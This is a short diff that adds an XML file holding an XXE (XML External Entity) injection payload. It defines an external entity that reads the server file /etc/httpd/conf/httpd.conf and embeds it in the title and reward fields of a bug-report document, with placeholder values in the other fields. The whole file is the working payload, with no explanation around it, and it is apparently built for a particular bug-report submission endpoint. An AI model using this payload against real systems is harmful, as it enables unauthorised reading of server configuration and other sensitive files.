@@ -1,0 +1,8 @@
+<?xml  version="1.0" encoding="ISO-8859-1"?>
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/httpd/conf/httpd.conf"> ]>
+		<bugreport>
+		<title>&xxe;</title>
+		<cwe>e</cwe>
+		<cvss>e</cvss>
+		<reward>&xxe;</reward>
+		</bugreport>
